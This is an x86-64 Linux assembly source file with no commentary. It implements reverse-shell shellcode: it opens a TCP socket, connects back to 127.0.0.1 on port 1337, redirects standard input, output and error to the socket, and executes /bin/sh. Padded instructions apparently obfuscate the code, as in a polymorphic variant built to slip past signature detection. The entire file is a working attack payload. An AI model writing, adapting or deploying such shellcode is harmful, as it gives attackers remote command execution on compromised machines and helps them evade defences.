BITS 64
global _start

section .text
_start: 
xor r9,r9
mov rax,r9
xor rdi,rdi
xor r10,r10
mov rsi,r10
xor rdx,rdx
xor r12,r12
mov rdx,r12
mov sil,0x01
mov dil,6
sub dil,4
mov al,0x29
syscall
mov r8b,al
mov dil,r8b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r8,rsp
mov rsi,r8
mov dl,0x10
mov al,43
sub al,1
syscall
xor r10,r10
mov r11,r10
mov dil,0x03
mov r10,r11
mov rsi,r10
mov al,0x21
syscall
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov sil,8
sub sil,7
mov al,0x21
syscall;
xor r15,r15
mov r11,r15
mov dil,0x03
mov sil,17
sub sil,15
mov al,0x21
syscall;
xor r8,r8
mov rax,r8
xor rdi,rdi
xor r8,r8
mov rsi,r8
xor r13,r13
mov r15b,59
mov al,r15b
mov rdi,"/bin/sh"
push r13
push rdi
mov r8,rsp
mov rdi,r8
push r13
push rdi
mov r12,rsp
mov rsi,r12
xor rdx,rdx
syscall
